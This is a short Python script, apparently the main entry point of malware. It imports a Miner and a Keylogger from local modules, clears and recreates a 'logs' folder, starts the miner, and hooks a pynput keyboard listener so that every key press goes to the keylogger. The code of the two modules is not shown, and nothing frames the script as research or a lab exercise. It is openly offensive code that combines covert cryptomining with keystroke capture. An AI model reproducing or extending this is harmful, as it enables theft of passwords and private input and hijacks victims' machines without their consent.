from miner import Miner
from keylogger import Keylogger
from pynput.keyboard import Listener
from shutil import rmtree as delete_directory
from os import makedirs as make_directory



if __name__ == '__main__':
    delete_directory("logs", ignore_errors=True)
    make_directory("logs")
    miner = Miner()
    keylogger = Keylogger()

    miner.start() # Miner start

    with Listener(on_press=keylogger.press) as listener: # Keypress listener
        listener.join()
